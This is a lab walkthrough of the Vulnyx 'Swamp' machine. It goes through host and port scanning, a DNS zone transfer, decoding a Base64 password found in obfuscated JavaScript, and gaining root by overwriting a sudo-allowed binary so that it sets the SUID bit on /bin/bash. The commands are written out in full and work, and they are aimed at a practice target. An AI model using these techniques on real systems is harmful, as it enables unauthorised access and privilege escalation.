---
icon: linux
---

# Swamp ​​

## 🖥️ Writeup - Swamp

**Platform:** Vulnyx\
**Operating System:** Linux

> **Tags:** `Linux` `DNS Zone Transfer` `AXFR` `JavaScript Deobfuscation` `Source Code` `Base64` `Sudoers` `Writable Script`

## INSTALLATION

We download the `zip` containing the `.ova` of the Swamp machine, extract it, and import it into VirtualBox.

We configure the network interface of the Swamp machine and run it alongside the attacker machine.

## HOST DISCOVERY

At this point, we still don’t know which `IP` address is assigned to Swamp, so we discover it as follows:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

Info:

```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:22:43:7a      1      60  PCS Systemtechnik GmbH      
 10.0.4.21       08:00:27:7f:d5:63      1      60  PCS Systemtechnik GmbH
```

We identify with high confidence that the victim’s IP is `10.0.4.21`.

## PORT SCANNING

Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.21
```

```bash
nmap -n -Pn -sCV -p22,53,80 --min-rate 5000 10.0.4.21
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 17:31 CEST
Nmap scan report for 10.0.4.21
Host is up (0.00020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
53/tcp open  domain  ISC BIND 9.18.28-1~deb12u2 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.18.28-1~deb12u2-Debian
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://swamp.nyx
MAC Address: 08:00:27:7F:D5:63 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.60 seconds
```

When we access port `80`, we get the following message:

```
Hmm. We’re having trouble finding that site.

We can’t connect to the server at swamp.nyx.
```

We must specify in the `/etc/hosts` file that the `IP` `10.0.4.21` should resolve to `swamp.nyx`.

```bash
sudo nano /etc/hosts
```

Info:

```
127.0.0.1	localhost
127.0.1.1	kali
10.0.4.21   swamp.nyx
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

After refreshing the browser, the web page loads, but nothing interesting is displayed.

## GOBUSTER

We proceed with `directory fuzzing` to identify hidden directories or files, but no results are found.

```bash
gobuster dir -u http://swamp.nyx -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
```

Next, we attempt to enumerate `subdomains`, leveraging the open port `53` (`DNS`).

```bash
dig @10.0.4.21 swamp.nyx AXFR
```

Info:

```
; <<>> DiG 9.20.11-4+b1-Debian <<>> @10.0.4.21 swamp.nyx AXFR
; (1 server found)
;; global options: +cmd
swamp.nyx.		604800	IN	SOA	ns1.swamp.nyx. . 2025010401 604800 86400 2419200 604800
swamp.nyx.		604800	IN	NS	ns1.swamp.nyx.
d0nkey.swamp.nyx.	604800	IN	A	0.0.0.0
dr4gon.swamp.nyx.	604800	IN	A	0.0.0.0
duloc.swamp.nyx.	604800	IN	A	0.0.0.0
f1ona.swamp.nyx.	604800	IN	A	0.0.0.0
farfaraway.swamp.nyx.	604800	IN	A	0.0.0.0
ns1.swamp.nyx.		604800	IN	A	0.0.0.0
shr3k.swamp.nyx.	604800	IN	A	0.0.0.0
swamp.nyx.		604800	IN	SOA	ns1.swamp.nyx. . 2025010401 604800 86400 2419200 604800
;; Query time: 0 msec
;; SERVER: 10.0.4.21#53(10.0.4.21) (TCP)
;; WHEN: Wed Sep 10 17:44:01 CEST 2025
;; XFR size: 10 records (messages 1, bytes 309)
```

We discover several subdomains and add them to the `/etc/hosts` file.

We navigate through all the discovered `subdomains` and eventually find a `script.js` file in the source code of `farfaraway.swamp.nyx`.

Opening the file, we see it is obfuscated using the `PACKER` method.

```js
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return' ..<Rest of the code>..
```

After deobfuscating the code, the result is as follows.

```js
!function()
	{
	var e;
	new Promise((e,t)=>
		{
		setTimeout(()=>
			{
			e("Value is positive: 5")
		}
		,1e3)
	}
	).then(e=>
		{
		console.log(e)
	}
	).catch(e=>
		{
		console.error(e)
	}
	);
	let t=async e=>
		{
		try
			{
			let t=await(await fetch(e)).json();
			console.log("Data fetch success:",t)
		}
		catch(o)
			{
			console.error("Error fetching data:",o)
		}
	};
	t("https://jsonplaceholder.typicode.com/posts"),(()=>
		{
		let e=document.createElement("div");
		e.innerHTML="Dynamically added text to the DOM",document.body.appendChild(e)
	}
	)();
	class o
		{
		constructor(e,t)
			{
			this.name=e,this.sound=t
		}
		speak()
			{
			console.log(`$
				{
				this.name
			}
			says:$
				{
				this.sound
			}
			`)
		}
	}
	let a=new o("Dog","Woof"),l=new o("Cat","Meow");
	a.speak(),l.speak();
	let r=[1,2,3,4,5],n=r.map(e=>2*e);
	console.log("Doubled numbers:",n);
	let s=r.reduce((e,t)=>e+t,0);
	console.log("Sum of numbers:",s);
	console.log("Updated user:",
		{
		name:"John",age:30,country:"USA"
	}
	),setInterval(()=>
		{
		console.log("This message repeats every 2 seconds")
	}
	,2e3),document.addEventListener("click",()=>
		{
		console.log("Click detected on the document")
	}
	);
	let g=new Date;
	console.log("Current date:",g.toString());
	let i=new Date(g.getFullYear()+1,g.getMonth(),g.getDate());
	console.log("Future date:",i.toString());
	let c=e=>
		{
		e%2==0?console.log(e+" is even"):console.log(e+" is odd")
	};
	[10,21,32,43,54].forEach(c),setTimeout(()=>
		{
		console.log("This runs after 3 seconds")
	}
	,3e3);
	(e=>
		{
		let t=e(10,20);
		console.log("Result from higher-order function:",t)
	}
	)((e,t)=>e+t);
	let
		{
		firstName:d,lastName:u,age:h
	}
	=
		{
		firstName:"Jane",lastName:"Doe",age:25
	};
	console.log(`Destructuring:$
		{
		d
	}
	$
		{
		u
	}
	,Age:$
		{
		h
	}
	`);
	let m=new Map;
	m.set("name","Shrek"),m.set("age",30),m.set("location","Far Far Away"),console.log("Map values:"),m.forEach((e,t)=>
		{
		console.log(t+": "+e)
	}
	);
	let p=new Set([1,2,3,4,4,5]);
	console.log("Set values (no duplicates):",Array.from(p));
	let $=function*e()
		{
		yield"First part",yield"Second part",yield"Third part"
	}
	();
	console.log($.next().value),console.log($.next().value),console.log($.next().value);
	console.log("Hello, John! Welcome to the page.");
	Password:c2hyZWs6cHV0b3Blc2FvZWxhc25v;
	let f=JSON.parse('
		{
		"name":"Shrek","age":30
	}
	');
	console.log("Parsed JSON data:",f),"geolocation"in navigator?navigator.geolocation.getCurrentPosition(e=>
		{
		console.log("Your current location:",e.coords.latitude,e.coords.longitude)
	}
	,e=>
		{
		console.error("Error getting location:",e)
	}
	):console.log("Geolocation not available");
	let v="    JavaScript is fun!   ",y=v.trim();
	console.log("Trimmed string:",y);
	let S=v.toUpperCase();
	console.log("Uppercase string:",S),localStorage.setItem("user",JSON.stringify(
		{
		name:"Shrek",age:30
	}
	));
	let w=JSON.parse(localStorage.getItem("user"));
	console.log("Stored user in localStorage:",w),console.log("Random number:",Math.random()),console.log("Square root of 16:",Math.sqrt(16)),console.log("PI value:",Math.PI)
}
();
```

In particular, we focus on this part of the code:

```js
console.log($.next().value),console.log($.next().value),console.log($.next().value);
	console.log("Hello, John! Welcome to the page.");
	Password:c2hyZWs6cHV0b3Blc2FvZWxhc25v;
	let f=JSON.parse('
		{
		"name":"Shrek","age":30
```

We find a password value that looks like a Base64-encoded string:

```
c2hyZWs6cHV0b3Blc2FvZWxhc25v
```

```bash
echo "c2hyZWs6cHV0b3Blc2FvZWxhc25v" | base64 -d
```

Info:

```
shrek:putopesaoelasno
```

Decoding it reveals valid credentials for the user `shrek` : `putopesaoelasno`.

We attempt to authenticate as `shrek` via `SSH`, and it works successfully.

Inside the `/home/shrek` directory, we find the `user flag`.

```
7d199d72f12135ef193ad19faf9468ef
```

## PRIVILEGE ESCALATION

We check for `sudo` privileges, `SUID` binaries, and `Capabilities`.

```bash
sudo -l
```

Info:

```
Matching Defaults entries for shrek on swamp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User shrek may run the following commands on swamp:
    (ALL) NOPASSWD: /home/shrek/header_checker
```

We discover that we can execute the `header_checker` binary with `root` privileges. Therefore, we attempt to modify it so that it executes arbitrary code.

```bash
printf '#!/bin/bash\nchmod u+s /bin/bash\n' > header_checker
```

Next, we run the binary to trigger the code we injected.

```bash
sudo /home/shrek/header_checker
```

Finally, with this execution, we escalate to `root` privileges:

```bash
bash -p
```

Info:

```
bash-5.2# whoami
root
bash-5.2#
```

We find the `root flag` inside the `/root` directory.

```
9c7bddee2e2fb8ad03854f106f23c6b5
```
